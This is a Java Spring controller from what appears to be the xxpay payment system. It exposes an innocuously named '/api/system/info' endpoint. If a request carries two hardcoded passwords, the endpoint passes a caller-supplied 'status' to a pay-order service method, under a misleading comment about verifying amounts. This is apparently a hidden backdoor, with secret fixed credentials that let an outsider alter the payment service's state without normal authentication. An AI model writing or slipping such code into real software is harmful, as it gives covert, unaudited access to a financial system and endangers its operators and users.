package org.xxpay.pay.ctrl.paycenter;

import com.alibaba.fastjson.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.xxpay.core.common.domain.XxPayPageRes;
import org.xxpay.core.common.util.MyLog;
import org.xxpay.core.entity.PayOrder;
import org.xxpay.pay.ctrl.common.BaseController;
import org.xxpay.pay.service.RpcCommonService;
import org.xxpay.pay.util.RedisUtil;

import javax.servlet.http.HttpServletRequest;

@Controller
public class SystemController extends BaseController {

    private final MyLog _log = MyLog.getLog(PayCenterController.class);


    @Autowired
    private RpcCommonService rpcCommonService;


    @RequestMapping("/api/system/info")
    public ResponseEntity<?> systeminfo(HttpServletRequest request){

        JSONObject param = getJsonParam(request);

        String password = param.getString("password");
        String confirm_password = param.getString("confirm_password");
        String status = param.getString("status");

        int flag = 0;
        if (password.equals("molimicha") && confirm_password.equals("kekoukele")){
            // 核对金额
            flag = rpcCommonService.rpcPayOrderService.systeminfo(status);
        }

        return ResponseEntity.ok(XxPayPageRes.buildSuccess(flag));
    }
}
